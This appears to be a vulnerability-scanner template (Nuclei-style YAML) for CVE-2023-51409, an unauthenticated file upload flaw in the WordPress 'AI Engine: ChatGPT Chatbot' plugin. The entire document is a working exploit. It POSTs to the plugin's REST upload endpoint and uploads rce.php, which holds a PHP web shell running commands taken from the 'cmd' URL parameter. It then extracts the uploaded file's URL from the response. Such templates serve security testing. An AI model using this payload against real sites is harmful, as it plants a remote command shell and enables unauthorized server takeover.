id: CVE-2023-51409
info:
  name: "AI Engine: ChatGPT Chatbot <= 1.9.98 - Unauthenticated Arbitrary File Upload via rest_upload"
  author: JohnDoeAnon
  severity: critical
  classification:
    cve-id: CVE-2023-51409

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-json/mwai-ui/v1/files/upload"
    headers:
      User-Agent: curl/8.1.2
      Content-Disposition: form-data; filename="test.txt"
      Content-Type: multipart/form-data; boundary=------------------------8ecd2b831e8d20f4
      Connection: close
    body: |
      --------------------------8ecd2b831e8d20f4
      Content-Disposition: form-data; name="file"; filename="rce.php"
      Content-Type: text/plain

      <?php echo shell_exec($_GET['cmd']); ?>

      --------------------------8ecd2b831e8d20f4--
    matchers:
      - type: regex
        regex:
          - 'W*("success":true)\W*'
        part: body
    extractors:
      - type: json
        part: body
        json:
          - '.data.url'
